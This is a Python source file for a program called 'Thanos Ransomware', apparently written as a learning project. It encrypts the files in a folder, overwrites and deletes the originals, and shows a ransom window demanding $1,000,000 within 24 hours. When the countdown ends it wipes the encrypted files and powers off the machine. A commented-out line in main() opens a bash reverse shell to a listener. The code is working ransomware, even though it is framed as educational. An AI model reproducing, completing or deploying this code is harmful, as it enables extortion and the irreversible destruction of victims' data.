#! /usr/bin/env python3
"""
Program Name: Thanos Ransomware
Author: Emmylee Crocker
Sources:
    https://infosecwriteups.com/how-to-make-a-ransomware-with-python-c4764f2014cf
	https://www.youtube.com/watch?v=UtMMjXOlRQc
	https://tutorialspoint.com/python

This program is intended for educational and research purposes ONLY
Any other use of this program is unauthorized and unintentional

Built-in modules
"""
import os
import shlex
import sys
# External modules #
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESCCM


IP = ''
PORT = ''


def you_lose():
    """
    If the user fails to pay within the 24-hour period.

    :return:  Nothing
    """
    # Delete all encrypted files in FileDock #
    [secure_delete(f'{encrypt_path}{file.name}') for file in os.scandir(encrypt_path)
     if os.path.isfile(f'{encrypt_path}{file.name}')]

    # Execute shell-escaped power off command #
    os.system(shlex.quote('poweroff -p'))


class MainApplication(tk.Frame):
    """ Class to initialize and manaage pytinker app """
    def __init__(self, parent, *args, **kwargs):
        tk.Frame.__init__(self, parent, *args, **kwargs)
        self.parent = parent

        # Set the app title #
        self.parent.title('Thanos Ransomware')
        # Set the app geometry (size) #
        self.parent.geometry('1000x300')

        # Set the label to notify user of infection #
        self.label1 = tk.Label(self.parent, text='Your important files have been encrypted!\n Pay '
                               'me $1,000,000 or I will delete them in 24 hours.\n\n',
                                font=('calibri', 20, 'bold'))
        self.label1.pack()

        # Set the count time label #
        self.label = tk.Label(self.parent, font=('calibri', 50, 'bold'), fg='white', bg='red')
        self.label.pack()

        # Set the pay now button #
        tk.Button(self.parent, text="Pay Now", command=lambda: [self.show_msg(),
                  self.close_window()]).pack(pady=30)

        self.countdown('24:00:00')

    def countdown(self, count):
        """
        Displays countdown until user is no longer able to recover their data.

        :param count:  The current time to be count down.
        :return:  Notify app to re-run function after 1000 milliseconds with updated countdown.
        """
        # Splits hour, minute, and seconds #
        hour, minute, second = count.split(':')
        try:
            hour = int(hour)
            minute = int(minute)
            second = int(second)

        # If error occurs typecasting string values to int #
        except ValueError as val_err:
            print_err(f'Error occurred converting time string to integer: {val_err}')
            sys.exit(4)

        self.label['text'] = f'{hour}:{minute}:{second}'

        # If there is still time to count down #
        if hour > 0 or minute > 0 or second > 0:
            if hour > 0:
                hour -= 1
                minute = 59
                second = 59

            if minute > 0:
                minute -= 1
                second = 59

            if second > 0:
                second -= 1

        # If the users time is up #
        else:
            # Call function to delete files and power off the system #
            you_lose()

        # Call countdown again after 1000ms (1s) #
        self.parent.after(1000, self.countdown, f'{hour}:{minute}:{second}')

    @staticmethod
    def show_msg():
        """
        Displays message when the payment button is pressed.

        :return:  Nothing
        """
        # Retrieve the encrypted secret #
        _, _, secret = get_crypt_comps()

        messagebox.showinfo(title='[!] Thank You for your Payment!',
                            message=f'Decryption password:  {secret.decode()}')

    def close_window(self):
        """
        Terminates the Thanos GUI window.

        :return:  Nothing
        """
        # Destroy window on exit #
        self.parent.destroy()


def secure_delete(path: str, passes=10):
    """
    Overwrite file data with random data number of specified passes and delete.

    :param path:  Path to the file to be overwritten and deleted.
    :param passes:  Number of pass to perform random data overwrite.
    :return:  Nothing
    """
    try:
        # Get the file size in bytes #
        length = os.stat(path).st_size

        # Open file and overwrite the data for number of passes #
        with open(path, 'wb') as file:
            for _ in range(passes):
                # Point file pointer to start of file #
                file.seek(0)
                # Write random data #
                file.write(os.urandom(length))

    # If file error occurs #
    except (OSError, IOError) as err:
        print_err(f'Error overwriting file for secure delete: {err}')
        sys.exit(3)

    os.remove(path)


def get_crypt_comps() -> tuple:
    """
    Reads the cryptographic components from file, splits into list to assign to unique variables, \
    decrypts AESCCM secret with Fernet key and returns all AESCCM components.

    :return:  Tuple of AESCCM components (key, nonce, secret).
    """
    try:
        # Read keys file in bytes mode #
        with open('thanos_keys.key', 'rb') as in_file:
            keys = in_file.read()

    # If error occurs during file operation #
    except (IOError, OSError, UnicodeError) as file_err:
        print_err(f'Error occurred reading key file contents: {file_err}')
        sys.exit(1)

    # Split file contents line by line as list #
    key_list = keys.split(b'\n')

    # Separate needed list contents into component variables #
    crypt_pass = key_list[0]
    nonce = key_list[2]
    fern_key = key_list[3]
    aesccm_key = key_list[4]

    # Decrypt the encrypted decrypt secret #
    plain_pass = Fernet(fern_key).decrypt(crypt_pass)

    return aesccm_key, nonce, plain_pass


def encrypt_data(files: list):
    """
    Call function to load and retrieve encryption components. The files in to be encrypted in the \
    FileDock are encrypted.

    :param files:  List of files to be encrypted.
    :return:  Nothing
    """
    # Read key file for cryptographic components #
    key, nonce, secret = get_crypt_comps()
    # Initialize AESCCM instance #
    aesccm = AESCCM(key)

    # Iterate through parsed files and encrypt #
    for file in files:
        try:
            # Read the original plain text data #
            with open(file, "rb") as plain_file:
                plain_data = plain_file.read()

            # Encrypt plain text data #
            crypt_data = aesccm.encrypt(nonce, plain_data, secret)

            # Write the encrypted data to fresh file #
            with open(f'{file}.Th4n0s', "wb") as crypt_file:
                crypt_file.write(crypt_data)

            # Overwrite original plain text with random
            # data for numerous passes and delete #
            secure_delete(file)

        # If error occurs during file operation #
        except (IOError, OSError) as file_err:
            # Print error and exit #
            print_err(f'File operation error occurred encryption loot: {file_err}')
            sys.exit(2)


def print_err(msg: str):
    """
    Prints error message via stderr.

    :param msg:  The error message to be displayed.
    :return:  Nothing
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


def main():
    """
    Encrypts files in FileDock and calls the Thanos application.

    :return:  Nothing
    """
    # Rev-shell call to listener #
    # os.system(shlex.quote(f'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'))

    files = []

    # If the FileDock for file encryption/decryption is missing #
    if not os.path.isdir(encrypt_path):
        # Create the missing FileDock #
        os.mkdir(encrypt_path)
        # Print error and exit #
        print_err('FileDock encryption directory was missing and now exists,'
                  ' place contents to encrypt in it and try again')
        sys.exit(1)

    # Append file to encryption list if current iteration is a file not in exception grouping #
    [files.append(f'{encrypt_path}{file.name}') for file in os.scandir(encrypt_path)
     if os.path.isfile(f'{encrypt_path}{file.name}')]

    # Retrieve crypto components and encrypt files #
    encrypt_data(files)

    # Initialize app #
    app = tk.Tk()
    MainApplication(app).pack(side='top', fill='both', expand=True)
    # Set the app to not resizeable #
    app.resizable(False, False)
    # Run app #
    app.mainloop()

    sys.exit(0)


if __name__ == '__main__':
    # Get the current working directory #
    cwd = os.getcwd()

    # If OS is Windows #
    if os.name == 'nt':
        # Set FileDock path #
        encrypt_path = f'{cwd}\\FileDock\\'
    # If OS is Linux #
    else:
        # Set FileDock path #
        encrypt_path = f'{cwd}/FileDock/'

    main()
